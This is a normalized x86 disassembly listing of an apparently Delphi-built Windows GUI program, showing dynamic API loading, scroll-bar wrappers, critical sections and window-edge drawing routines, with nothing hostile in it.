lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40594c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dcf2
lea eax [ ebx + 0xc ]
call sub_405934
sub_42dcf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_42dd8d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_40408c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42da84
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd94
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_42d598
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42d5c8
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42d768
sub_42ddb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42c114
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42c114
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4187c4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42c114
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4187c4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4187c4
sub_42de44
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_42d558
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4032a8
mov eax [ esi + 0x14 ]
call sub_4032a8
mov eax [ esi + 0x10 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405934
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42de98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42decf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ded6
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42dee0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42df05
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42df0c
retn
sub_42df18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42df49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42df50
retn
mov eax [ rw-data ]
call sub_4032a8
sub_42df5c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42df90
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42dfb8
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42e23a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e261
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e268
retn
sub_42e27c
enter 0x42e2 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl dl 0x1
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x48004032 ] bl
jecxz r-xdata
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x3fffbd1d ] dl
add [ ebx + 0x42 ] cl
add [ esi ] cl
push esp
push ebx
jns r-xdata
cmp ch 0xff
add ah cl
jecxz r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x2c ] si
jecxz r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + ebx * 8 - 0x1a17f08c ] 0x52
std
jmp [ edi + ecx * 4 + 0x5 ]
add [ eax ] dl
push esp
inc ebx
jb r-xdata
xor al [ eax ]
nop
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] dh
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
mov eax esi
test bl bl
je r-xdata
add al 0x50
call InitializeCriticalSection
jecxz r-xdata
add al al
inc edx
add [ eax + eax ] bl
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xe3
inc edx
add al dh
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42e350
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42e390
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42e3e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e40d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e414
retn
sub_42e420
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42e3d8
xor eax eax
push ebp
push sub_42e5d7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e5de
mov eax [ rw-data ]
call sub_42e3e0
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42e5e0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42e3d8
xor eax eax
push ebp
push sub_42e993
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e99a
mov eax [ rw-data ]
call sub_42e3e0
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42ed44
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42ed6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42edb4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42edbb
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4032a8
call sub_42e420
cmp [ rw-data ] 0x0
jg r-xdata
sub_42eddc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ee01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee08
retn
sub_42eed0
or cl cl
inc esp
add ah cl
or al [ ebp ]
add ah ch
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add [ ecx + esi * 8 ] ah
inc esp
add [ eax + 0x580044f7 ] bh
add eax 0xff440045
inc esp
add [ eax + 0x2 ] al
inc ebp
add [ eax ] dh
inc ebp
add al dh
add eax 0x5f40045
inc ebp
add [ esp + eax + 0x4540045 ] ch
inc ebp
add ah cl
xor [ ebp ] al
pushfd
push cs
inc ebp
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
push esp
inc edx
add [ eax + eax ] al
add [ eax ] 0xffffff85
add [ ebx ] bh
mov al 0x10
mov al 0x44
inc edx
add al al
inc edx
add [ esp + esi * 8 ] ah
inc edx
add [ eax - 0xc ] al
inc edx
add [ ebx ] cl
push esp
push esp
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
pop eax
out dx eax
inc edx
add [ edi ] al
or edx [ esp + edx * 2 + 0x6f ]
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0xee60776f
inc edx
add [ ebx + ecx * 4 ] ah
inc esp
add [ ebx ] cl
add [ edi ] al
push esp
outsd
outsd
insb
push edi
imul ebp [ esi ] r-xdata
enter 0x42ef 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xf0
inc edx
add [ eax ] dh
add [ eax ] al
pop esp
jae r-xdata
add [ eax - 0x60 ] dl
inc esp
add [ esp + esi * 8 + 0x42 ] ah
add ah ch
hlt
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 ] ah
inc esp
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah al
lahf
inc esp
add ah al
sahf
inc esp
add [ ecx ] bh
inc esp
add [ ebp + ebx * 4 - 0x634fffbc ] ch
inc esp
add ah dh
lahf
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
sub_42f1b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44edd8
mov al [ r-xdata ]
mov [ esi + 0x208 ] al
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x20a ] 0x2
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42f204
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x208 ] al
mov eax ebx
call sub_450658
sub_42f254
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
lea edi [ esp + 0x10 ]
push esp
mov eax ebx
call sub_4530b8
push eax
call GetClientRect
push edi
mov eax ebx
call sub_4530b8
push eax
call GetWindowRect
push 0x2
push edi
mov eax ebx
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
push esi
call ExcludeClipRect
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
push edi
call OffsetRect
xor eax eax
mov al [ ebx + 0x208 ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x209 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
push eax
push edi
push esi
call DrawEdge
mov eax [ edi + 0xc ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
push esi
call IntersectClipRect
mov eax [ ebx + 0x170 ]
call sub_424ca4
push eax
push edi
push esi
call FillRect
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_42f344
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov esi [ edi + 0x8 ]
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov ebp esi
push ebp
call InflateRect
xor eax eax
cmp [ ebx + 0x209 ] 0x0
je r-xdata
cmp [ ebx + 0x20a ] 0x0
je r-xdata
inc eax
mov esi ebp
test [ ebx + 0x208 ] 0x1
je r-xdata
inc eax
test [ ebx + 0x208 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x208 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x208 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
mov edx edi
mov eax ebx
call sub_453e80
pop ebp
pop edi
pop esi
pop ebx
retn
sub [ esi + 0xc ] eax
sub_42f3c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42f416
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f41d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ReleaseDC
retn
sub_42f464
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
mov ecx edi
xor edx edx
mov eax esi
call sub_449f60
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
test bl bl
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
mov eax edi
call sub_44c804
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_44c818
mov ecx eax
mov edx [ ebp - 0x4 ]
sub edx 0xa
mov eax [ ebp - 0x8 ]
sub eax 0xa
call sub_4172c0
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_44d7a4
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42f4f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebx + 0x38 ]
call sub_464294
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call sub_44a114
jmp r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edi [ ebx + 0x38 ]
mov edx [ edi + 0x44 ]
mov eax [ edi + 0x40 ]
call sub_41725c
cmp esi [ ebx + 0x38 ]
je r-xdata
mov eax [ ebx + 0x50 ]
mov ebp [ ebx + 0x48 ]
sub eax ebp
add eax [ esi + 0x4c ]
mov edx [ ebx + 0x38 ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ ebx + 0x4c ]
mov edi [ ebx + 0x44 ]
sub ecx edi
add ecx [ esi + 0x48 ]
mov eax [ ebx + 0x38 ]
sub ecx [ eax + 0x48 ]
mov edx ebp
add edx [ esi + 0x44 ]
sub edx [ esp + 0xc ]
mov eax edi
add eax [ esi + 0x40 ]
sub eax [ esp + 0x8 ]
call sub_4172c0
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44c234
push 0x1
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov eax esi
call sub_4530b8
push eax
call MapWindowPoints
sub_42f5b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46a390
mov edx 0x1
mov eax esi
call sub_4531d8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42f60c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov bl 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x309 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x308 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451b54
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
mov esi [ ebp - 0xc ]
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x308 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x300 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2fc ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_451b68
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x18 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x18 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x309 ] 0x1
xor eax eax
push ebp
push sub_42f746
push [ fs : eax ]
mov [ fs : eax ] esp
sub edi [ ebp - 0x10 ]
push edi
sub esi [ ebp - 0x14 ]
push esi
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f74d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x309 ] 0x0
retn
mov eax [ ebp - 0x4 ]
add edi [ eax + 0x304 ]
jmp r-xdata
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_42f74d
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
add eax [ ebp - 0x10 ]
